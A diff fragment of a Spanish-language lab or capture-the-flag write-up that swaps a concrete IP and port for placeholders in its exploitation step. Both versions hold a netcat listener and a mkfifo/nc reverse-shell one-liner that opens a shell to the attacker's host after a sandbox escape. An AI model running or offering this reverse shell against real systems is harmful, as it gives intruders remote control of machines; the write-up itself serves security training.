@@ -97,13 +97,13 @@ console.log(vm.run(code));
 Una vez confirmada la vulnerabilidad, el acceso es ya algo mecánico. Abrimos puerto en escucha: 
 
 ```shell
-nc -lvp 4444
+nc -lvp <port>
 ```
 
 Introducimos una [reverse shell](https://www.revshells.com/) con el siguiente comando: 
 
 ```shell 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.78 4444 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your ip> <port> >/tmp/f
 ```
 
 
